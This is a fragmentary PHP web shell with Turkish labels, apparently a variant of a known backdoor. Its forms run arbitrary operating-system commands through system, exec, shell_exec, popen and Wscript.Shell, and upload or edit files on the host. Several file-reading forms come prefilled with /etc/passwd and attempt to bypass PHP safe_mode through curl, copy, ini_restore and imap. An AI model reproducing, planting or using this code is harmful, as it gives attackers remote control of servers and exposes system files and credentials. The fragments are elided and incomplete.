...
if (empty($_POST['command'])) {
    ...
    $tb->headerform(['content' => '<FONT COLOR=#9C9C9C>cmd:</FONT>' . $tb->makeselect(['name' => 'execfunc', 'option' => $execfuncs, 'selected' => $execfunc]) . ' ' . $tb->makeinput('command') . ' ' . $tb->makeinput('Run', 'command', '', 'submit')]);
...
$tb->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td>');
$tb->headerform(['content' => '<FONT COLOR=#9C9C9C>Dosya Duzenle weya Olustur:</FONT>' . $tb->makehidden('dir', getcwd()) . ' ' . $tb->makeinput('editfile') . ' ' . $tb->makeinput('Edit', 'Duzenle', '', 'submit')]);

$tb->headerform(['action' => '?dir=' . urlencode($dir), 'enctype' => 'multipart/form-data', 'content' => '<FONT COLOR=#9C9C9C>Dosya Yukle:</FONT>' . $tb->makeinput('uploadfile', '', '', 'file') . ' ' . $tb->makeinput('doupfile', 'Ekle', '', 'submit') . $tb->makeinput('uploaddir', $dir, '', 'hidden')]);

$tb->headerform(['content' => '<FONT COLOR=#9C9C9C>Dizin Olustur:</FONT> ' . $tb->makeinput('newdirectory') . ' ' . $tb->makeinput('createdirectory', 'yenidizin', '', 'submit')]);
$execfuncs = ('WIN' == substr(PHP_OS, 0, 3)) ? ['system' => 'system', 'passthru' => 'passthru', 'exec' => 'exec', 'shell_exec' => 'shell_exec', 'popen' => 'popen', 'wscript' => 'Wscript.Shell'] : ['system' => 'system', 'passthru' => 'passthru', 'exec' => 'exec', 'shell_exec' => 'shell_exec', 'popen' => 'popen'];
$tb->headerform(['content' => '<FONT COLOR=#9C9C9C>cmd:</FONT>' . $tb->makeselect(['name' => 'execfunc', 'option' => $execfuncs, 'selected' => $execfunc]) . ' ' . $tb->makeinput('command') . ' ' . $tb->makeinput('Run', 'command', '', 'submit')]);
...
if (!isset($_GET['action']) or empty($_GET['action']) or ('dir' == $_GET['action'])) {
    ...
    class FORMS
    {
        ...
        public function tdheader($title)
        {
            global $dir;
...
$tb->headerform(['content' => '<FONT COLOR=#9C9C9C>read file :</FONT><br>' . $tb->makeinput('Mohajer22', '/etc/passwd') . $tb->makeinput('', Show, 'Mohajer22', 'submit')]);
$tb->headerform(['content' => '<FONT COLOR=#9C9C9C>read file id:</FONT><br>' . $tb->makeid('plugin', 'cat /etc/passwd') . $tb->makeinput('', Show, 'plugin', 'submit')]);
$tb->headerform(['content' => '<FONT COLOR=#9C9C9C>read file CURL:</FONT><br>' . $tb->makeinput('curl', '/etc/passwd') . $tb->makeinput('', Show, 'curl', 'submit')]);
$tb->headerform(['content' => '<FONT COLOR=#9C9C9C>read file copy:</FONT><br>' . $tb->makeinput('copy', '/etc/passwd') . $tb->makeinput('', Show, 'copy', 'submit')]);
$tb->headerform(['content' => '<FONT COLOR=#9C9C9C>read file ini_restore:</FONT><br>' . $tb->makeinput('M2', '/etc/passwd') . $tb->makeinput('', Show, 'M2', 'submit')]);
$tb->headerform(['content' => '<FONT COLOR=#9C9C9C>read file or dir with imap:</FONT><br>' . $tb->makeimp('switch', '/etc/passwd') . $tb->makeinput('string', '/etc/passwd') . $tb->makeinput('string', 'Show', '', 'submit')]);
$tb->headerform(['content' => '<FONT COLOR=#9C9C9C>Make file ERORR:</FONT><br>' . $tb->makeinput('ER', 'Mohajer22.php') . $tb->makeinput('ER', 'Write', 'ER', 'submit')]);
...
$tb->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td>');
  ...
  if (!ini_get('safe_mode')) {
      die("<font size=-2 face=verdana color='#9B9B9B'>Safe-mode is OFF.</font>");
  }
echo "<textarea method='POST' cols='95' rows='30' wrar='off' >";
  $c = 0; $D = [];
